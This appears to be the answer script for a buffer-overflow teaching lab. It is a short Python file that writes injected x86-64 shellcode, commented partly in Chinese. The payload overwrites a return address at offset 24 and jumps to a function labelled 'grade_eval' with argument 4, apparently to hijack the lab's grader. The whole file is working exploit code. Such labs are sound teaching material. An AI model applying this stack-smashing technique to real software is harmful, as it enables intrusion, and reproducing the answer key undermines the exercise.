#!/usr/bin/env python3
import sys
payload = (
    b"\xbf\x04\x00\x00\x00"                          # mov edi, 0x4
    b"\xb8\x87\x1a\x40\x00"                          # mov eax, 0x401a87 (grade_eval)
    b"\x48\xbb\xf0\x0f\x80\x00\x10\x72\x00\x00"      # movabs rbx, 0x721000800ff0
    b"\x53"                                          # push rbx
    b"\xff\xe0"                                      # jmp rax
    b"\x90"                                          # nop，补齐到偏移 24
    b"\xd0\x0f\x80\x00\x10\x72\x00\x00"              # 小端 0x721000800fd0，覆盖 input 返回地址
    b"\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05"        # xor edi,edi; mov eax,60; syscall = exit(0)
)

sys.stdout.buffer.write(payload)